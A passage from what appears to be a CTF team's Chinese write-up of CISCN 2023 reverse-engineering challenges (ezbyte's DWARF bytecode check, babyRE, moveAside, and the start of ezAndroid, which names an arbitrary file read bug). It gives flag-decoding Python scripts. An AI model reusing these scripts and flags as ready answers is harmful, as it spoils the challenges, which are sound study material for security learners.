style="color:#ae81ff">0x68</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0x5f</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> researchproducttestpublic[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x6e</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x3d</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0x3a</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0xc2</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0xe1</span>,<span style="color:#ae81ff">0x22</span>,<span style="color:#ae81ff">0x77</span>,<span style="color:#ae81ff">0x43</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x0c</span>,<span style="color:#ae81ff">0x35</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x64</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0xcd</span>,<span style="color:#ae81ff">0xee</span>,<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0x7b</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x37</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, zero, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;null&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, research, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;research&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, product, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;product&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, test, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;test&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, public, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;public&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, researchproduct, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;research|product&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, researchtest, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;research|test&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, researchpublic, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;research|public&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, researchtestpublic, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;research|test|public&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, researchproductpublic, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;research|product|public&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, researchproducttest, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;research|product|test&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, producttest, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;product|test&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, productpublic, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;product|public&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, producttestpublic, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;product|test|public&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, testpublic, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;test|public&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>pcrComp.pcrValue, researchproducttestpublic, <span style="color:#ae81ff">32</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        strcpy(solve_result,<span style="color:#e6db74">&#34;research|product|test|public&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>运行 <code>./player.sh</code> 即可得到 flag：​</p>
<h2 id="reverse">Reverse</h2>
<h3 id="ezbyte">ezbyte</h3>
<p>先用ida打开 G快捷键跳转到start​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 133; 
			flex-basis: 319px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re1.png" data-size="723x543">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re1.png"
			width="723"
			height="543"
			srcset="/post/ciscn-2023-writeup-by-or4nge/re1_hu9a7ccb7014eb922659f467917da14ada_29886_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/re1_hu9a7ccb7014eb922659f467917da14ada_29886_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
找到主函数逻辑​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 228; 
			flex-basis: 547px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re2.PNG" data-size="1262x553">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re2.PNG"
			width="1262"
			height="553"
			srcset="/post/ciscn-2023-writeup-by-or4nge/re2_hud139fc23aca1d7e94d091baba7e70abf_37722_480x0_resize_box_3.PNG 480w, /post/ciscn-2023-writeup-by-or4nge/re2_hud139fc23aca1d7e94d091baba7e70abf_37722_1024x0_resize_box_3.PNG 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
动调发现在函数sub_404C21内部​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 150; 
			flex-basis: 361px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re3.png" data-size="1039x690">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re3.png"
			width="1039"
			height="690"
			srcset="/post/ciscn-2023-writeup-by-or4nge/re3_hu6f57c2b9145c3030c119abd039363c54_35588_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/re3_hu6f57c2b9145c3030c119abd039363c54_35588_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
构造输⼊字符串满⾜所有if条件，进⼊sub_404BF5，在函数sub_404BF5处抛出异常，做栈展开，首先执行该函数的字节码</p>
<p>使用readelf &ndash;debug-dump=frames ezbyte，搜索该函数字节码​</p>
<pre tabindex="0"><code>00000040 0000000000000094 00000044 FDE cie=00000000 pc=0000000000404bf5..0000000000404c21​
  DW_CFA_advance_loc: 5 to 0000000000404bfa​
  DW_CFA_def_cfa_offset: 16​
  DW_CFA_offset: r6 (rbp) at cfa-16​
  DW_CFA_advance_loc: 3 to 0000000000404bfd​
  DW_CFA_def_cfa_register: r6 (rbp)​
  DW_CFA_val_expression: r12 (r12) (​
    DW_OP_constu: 2616514329260088143; ​
    DW_OP_constu: 1237891274917891239; ​
    DW_OP_constu: 1892739; ​
    DW_OP_breg12 (r12): 0; ​
    DW_OP_plus; ​
    DW_OP_xor; ​
    DW_OP_xor; ​
    DW_OP_constu: 8502251781212277489; ​
    DW_OP_constu: 1209847170981118947; ​
    DW_OP_constu: 8971237; ​
    DW_OP_breg13 (r13): 0; ​
    DW_OP_plus; ​
    DW_OP_xor; ​
    DW_OP_xor; ​
    DW_OP_or; ​
    DW_OP_constu: 2451795628338718684; ​
    DW_OP_constu: 1098791727398412397; ​
    DW_OP_constu: 1512312; ​
    DW_OP_breg14 (r14): 0; ​
    DW_OP_plus; ​
    DW_OP_xor; ​
    DW_OP_xor; ​
    DW_OP_or; ​
    DW_OP_constu: 8722213363631027234; ​
    DW_OP_constu: 1890878197237214971; ​
    DW_OP_constu: 9123704; ​
    DW_OP_breg15 (r15): 0; ​
    DW_OP_plus; ​
    DW_OP_xor; ​
    DW_OP_xor; ​
    DW_OP_or​
  )​
  DW_CFA_nop​
  DW_CFA_nop​
  DW_CFA_nop
</code></pre><p>分析DWARF字节码</p>
<blockquote>
<p><code>DW_OP_constu: 2616514329260088143</code> <code>DW_OP_constu</code>表示将一个无符号整数常量推送到表达式栈上。在这里，值为2616514329260088143的常量被推送到栈上。​
<code>DW_OP_constu: 1237891274917891239</code> 同样地，这个指令将值为1237891274917891239的无符号整数常量推送到表达式栈上。​
<code>DW_OP_constu: 1892739</code> 这个指令将值为1892739的无符号整数常量推送到表达式栈上。​
<code>DW_OP_breg12 (r12): 0</code> <code>DW_OP_breg</code>指令用于基于基址寄存器的偏移量来计算一个新的值。这里，<code>DW_OP_breg12</code>表示使用r12作为基址寄存器，并将其偏移量设置为0。​
<code>DW_OP_plus</code> <code>DW_OP_plus</code>指令表示将栈顶的两个值相加，并将结果推送回栈上。在这里，它将前面推送的三个常量值进行相加。​
<code>DW_OP_xor</code> <code>DW_OP_xor</code>指令表示对栈顶的两个值进行异或操作，并将结果推送回栈上。在这里，它将上一个指令相加的结果与前面推送的常量值进行异或操作。​
<code>DW_OP_xor</code> 这是另一个<code>DW_OP_xor</code>指令，它继续对栈顶的两个值进行异或操作。可能是为了进一步混淆计算结果。​
<code>DW_OP_breg12 (r12): 0</code> 是一个DWARF操作码指令，用于基于基址寄存器的偏移量来计算一个新的值。​
在这个指令中，<code>DW_OP_breg12</code> 表示使用 r12 寄存器作为基址寄存器，并将其偏移量设置为 0。这意味着该指令在当前上下文中将使用 r12 寄存器的值，并将其与偏移量 0 相加，以计算出一个新的值。​
<code>DW_OP_or</code> 是DWARF调试信息格式中的一个操作码指令，用于执行逻辑或（OR）操作。​
在DWARF中，<code>DW_OP_or</code> 操作码指示在调试信息表达式中执行逻辑或操作。它将栈顶的两个值（布尔值或整数）进行逻辑或运算，并将结果推送回栈上。​
具体而言，<code>DW_OP_or</code> 的行为如下：​
从栈上弹出两个值。​
如果这两个值中至少有一个非零（True），则将结果置为 1。​
如果这两个值都是零（False），则将结果置为 0。​
将结果推送回栈上。</p>
</blockquote>
<p>分析发现，读取r12~r15，做异或和加法，判断最终值是否为0，写出解密脚本​</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r12<span style="color:#f92672">=</span>(<span style="color:#ae81ff">2616514329260088143</span><span style="color:#f92672">^</span><span style="color:#ae81ff">1237891274917891239</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1892739</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>r13<span style="color:#f92672">=</span>(<span style="color:#ae81ff">8502251781212277489</span><span style="color:#f92672">^</span><span style="color:#ae81ff">1209847170981118947</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">8971237</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>r14<span style="color:#f92672">=</span>(<span style="color:#ae81ff">2451795628338718684</span><span style="color:#f92672">^</span><span style="color:#ae81ff">1098791727398412397</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1512312</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>r15<span style="color:#f92672">=</span>(<span style="color:#ae81ff">8722213363631027234</span><span style="color:#f92672">^</span><span style="color:#ae81ff">1890878197237214971</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">9123704</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>r12<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#39;little&#39;</span>)<span style="color:#f92672">+</span>r13<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#39;little&#39;</span>)<span style="color:#f92672">+</span>r14<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#39;little&#39;</span>)<span style="color:#f92672">+</span>r15<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#39;little&#39;</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3861}&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span></code></pre></div><p>​</p>
<h3 id="babyre">babyRE</h3>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 184; 
			flex-basis: 443px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re4.png" data-size="1280x693">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re4.png"
			width="1280"
			height="693"
			srcset="/post/ciscn-2023-writeup-by-or4nge/re4_huad2335f429b22e1c521d93ba7863d59e_1115206_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/re4_huad2335f429b22e1c521d93ba7863d59e_1115206_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
下载得到一个xml文件,进入相应网站，玩玩游戏之后点开lock，可得到主逻辑​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 179; 
			flex-basis: 431px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re5.png" data-size="1280x712">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re5.png"
			width="1280"
			height="712"
			srcset="/post/ciscn-2023-writeup-by-or4nge/re5_huc539ce18922da0ba192ab9ff031eae0e_394069_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/re5_huc539ce18922da0ba192ab9ff031eae0e_394069_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
分析逻辑发现这里用到了secret变量，并在xml文件末尾找到了serect list但是根据简单的加密逻辑解密后发现不对，再观察发现前面的secret变换了，发现能保存xml，保存发现secret list发生变化​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 182; 
			flex-basis: 438px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re6.png" data-size="1280x701">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re6.png"
			width="1280"
			height="701"
			srcset="/post/ciscn-2023-writeup-by-or4nge/re6_hu11559c0765e2389a0c7ca266b9a1c841_786481_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/re6_hu11559c0765e2389a0c7ca266b9a1c841_786481_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
将此serect list代入解题脚本，即可得flag​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 189; 
			flex-basis: 455px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re7.png" data-size="1280x675">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re7.png"
			width="1280"
			height="675"
			srcset="/post/ciscn-2023-writeup-by-or4nge/re7_hu8d91781b329feafc37b4061c4f3185a2_238047_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/re7_hu8d91781b329feafc37b4061c4f3185a2_238047_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cmp_bytes<span style="color:#f92672">=</span>[<span style="color:#ae81ff">102</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">74</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">85</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">75</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">92</span>,<span style="color:#ae81ff">92</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">81</span>,<span style="color:#ae81ff">83</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">76</span>,<span style="color:#ae81ff">88</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">73</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">86</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">87</span>,<span style="color:#ae81ff">87</span>,<span style="color:#ae81ff">82</span>,<span style="color:#ae81ff">84</span>,<span style="color:#ae81ff">85</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">85</span>,<span style="color:#ae81ff">87</span>,<span style="color:#ae81ff">30</span>]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,len(cmp_bytes)):<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    cmp_bytes[i]<span style="color:#f92672">^=</span>cmp_bytes[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>print(bytes(cmp_bytes))<span style="color:#960050;background-color:#1e0010">​</span>
</span></span></code></pre></div><h3 id="moveaside">moveAside</h3>
<p>程序开头先使用sigaction替换异常处理函数，分别是内存访问异常和未知指令异常，未知指令异常用来做循环，内存访问异常用来调用库函数​
动调发现首先使用time，srand和rand做随机数（没用），然后scanf读取数据，将读取数据的地址下内存断点
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 292; 
			flex-basis: 703px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re8.png" data-size="829x283">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re8.png"
			width="829"
			height="283"
			srcset="/post/ciscn-2023-writeup-by-or4nge/re8_hu07c7ea8d2b450925b6170aa1d2c124ab_29523_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/re8_hu07c7ea8d2b450925b6170aa1d2c124ab_29523_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
在用户段断住后，步过查看加密算法​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 178; 
			flex-basis: 429px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re9.png" data-size="1056x590">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re9.png"
			width="1056"
			height="590"
			srcset="/post/ciscn-2023-writeup-by-or4nge/re9_hua426aedda6b50ab141aa9018712d913e_101462_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/re9_hua426aedda6b50ab141aa9018712d913e_101462_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
发现是+0x18，然后异或0x19，最后与已知字节比较，写出解密脚本​</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cmp_bytes<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x9D</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x8A</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x5C</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x5C</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x5C</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x5C</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x8C</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x46</span>]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>cmp_bytes<span style="color:#f92672">=</span>[(i<span style="color:#f92672">^</span><span style="color:#ae81ff">0x19</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x18</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> cmp_bytes]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>print(bytes(cmp_bytes))<span style="color:#960050;background-color:#1e0010">​</span>
</span></span></code></pre></div><h3 id="ezandroid">ezAndroid​</h3>
<p>首先找到服务端所用的安卓程序<code>/priv-app/cpeweb.apk</code>，分析<code>com.wowi.nanoweb.webserver</code>类，可以发现一个任意文件读的漏洞​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 239; 
			flex-basis: 574px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/re10.png" data-size="1007x421">
		<img src="/post/ciscn-2023-writeup-by-or4nge/re10.png"
			width="1007"
			height="421"
